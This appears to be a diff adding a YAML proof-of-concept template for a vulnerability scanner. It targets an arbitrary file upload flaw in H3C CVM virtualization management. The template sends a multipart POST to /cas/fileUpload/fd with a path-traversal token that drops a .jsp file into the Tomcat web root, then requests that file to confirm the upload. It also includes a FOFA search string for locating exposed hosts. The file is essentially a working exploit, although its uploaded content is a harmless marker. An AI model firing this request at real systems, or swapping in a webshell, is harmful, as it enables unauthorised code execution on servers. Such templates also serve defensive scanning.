@@ -1,0 +1,44 @@
+id: poc-yaml-h3c-cvm-fd-anyfile-upload
+info:
+  name: H3C CVM fd 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: H3C-CVM
+  fofa: app="H3C-CVM"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /cas/fileUpload/fd
+  headers:
+    Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
+  data: '--a4d7586ac9d50625dee11e86fa69bc71
+
+    Content-Disposition: form-data; name="token"
+
+
+    /../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{.t1}}.jsp
+
+    --a4d7586ac9d50625dee11e86fa69bc71
+
+    Content-Disposition: form-data; name="file"; filename="321.jsp"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    --a4d7586ac9d50625dee11e86fa69bc71--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"success") &&
+
+    contains(body,"true")
+
+    '
+- method: GET
+  path: /cas/js/lib/buttons/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
